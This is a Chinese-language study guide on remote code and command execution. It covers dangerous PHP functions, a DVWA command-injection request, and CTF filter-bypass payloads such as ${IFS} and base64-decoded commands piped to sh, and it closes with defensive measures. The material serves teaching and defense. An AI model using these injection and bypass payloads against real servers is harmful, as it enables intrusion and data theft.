## 漏洞概述

### 定义与危害
- **远程代码执行（RCE）**：攻击者通过漏洞在目标服务器上执行任意代码  
- **远程命令执行（RCE）**：直接执行系统命令获取服务器权限  
- **核心危害**：  
  - 服务器完全沦陷  
  - 敏感数据泄露（如数据库凭证、配置文件）  
  - 植入木马、勒索软件或挖矿程序  
  - 内网横向渗透  

### 典型漏洞案例
| **CVE编号**      | **影响产品**           | **利用方式**                          |
|------------------|-----------------------|--------------------------------------|
| CVE-2021-3177    | Python               | 类型混淆导致代码执行                   |
| CVE-2021-21972   | VMware vCenter Server | 未授权上传恶意文件触发RCE              |
| CNVD-2020-46552  | 深信服EDR             | 后台命令注入漏洞                       |

## PHP相关危险函数

### 代码注入类函数
| **函数**               | **行为**                                                                 | **风险示例**                          |
|------------------------|-------------------------------------------------------------------------|--------------------------------------|
| `eval()`              | 将字符串作为PHP代码执行                                                  | `eval($_GET['code']);`              |
| `preg_replace()`      | 使用`/e`修饰符时执行替换内容                                              | `preg_replace("/.*/e", "system('id')", $input)` |
| `create_function()`   | 动态创建匿名函数                                                         | 通过参数注入恶意代码                   |

### 命令执行类函数
| **函数**               | **行为**                                                                 | **风险示例**                          |
|------------------------|-------------------------------------------------------------------------|--------------------------------------|
| `system()`            | 执行系统命令并输出结果                                                   | `system($_GET['cmd']);`             |
| `shell_exec()`        | 执行命令并返回完整输出                                                   | `echo shell_exec('whoami');`        |
| `proc_open()`         | 高级进程控制接口                                                         | 可构建复杂命令执行链                   |

## 靶场实战案例

### 命令拼接符号
| **系统**  | **符号** | **作用**                                  | **示例**                          |
|----------|----------|------------------------------------------|----------------------------------|
| Windows  | `&&`     | 前序命令成功时执行后续命令                 | `ping 127.0.0.1 && whoami`       |
|          | `\|`     | 管道符传递输出                            | `netstat -ano \| findstr 3306`   |
| Linux    | `;`      | 无条件顺序执行                            | `ls; cat /etc/passwd`            |
|          | `$()`    | 命令替换                                  | `echo $(id)`                     |

### DVWA漏洞利用
```http
GET /dvwa/vulnerabilities/exec/?ip=127.0.0.1%26%26whoami HTTP/1.1
```
- **Payload解析**：`%26%26`为URL编码的`&&`，实现命令拼接  
- **利用效果**：执行`ping 127.0.0.1 && whoami`

## CTF实战技巧

### 过滤绕过技术
| **过滤项**       | **绕过方法**                                                                 | **示例**                              |
|------------------|-----------------------------------------------------------------------------|--------------------------------------|
| 空格过滤         | 使用`${IFS}`、`%09`、`<`、`>`等替代                                          | `cat${IFS}flag.txt`                 |
| 目录分隔符       | 用`;`或`%0a`分隔命令                                                        | `127.0.0.1;cat${IFS}/flag`          |
| 关键字过滤       | Base64编码+管道符解码                                                        | `echo "Y2F0IGZsYWc=" \| base64 -d \| sh` |
| 运算符过滤       | 使用`more`、`less`等替代`cat`                                               | `less flag.php \| base64`           |

### 综合利用示例
```http
GET /rce?input=127.0.0.1%0acd${IFS}secret_dir%0als HTTP/1.1
```
- **Payload解析**：  
  - `%0a`为换行符，分隔多条命令  
  - `cd secret_dir`进入目标目录  
  - `ls`列出文件

## 漏洞防御方案

### 代码层防护
1. **禁用危险函数**：  
   ```php
   // php.ini配置
   disable_functions = system,exec,shell_exec,passthru
   ```
2. **输入白名单校验**：  
   ```php
   $allowed_commands = ['ping', 'traceroute'];
   if (!in_array($_GET['cmd'], $allowed_commands)) {
       die("非法命令！");
   }
   ```

### 基础设施加固
- **WAF规则**：拦截包含`&&`、`|`、`${IFS}`等敏感字符的请求  
- **权限最小化**：Web服务器以低权限用户运行  
- **日志监控**：实时审计系统命令执行日志
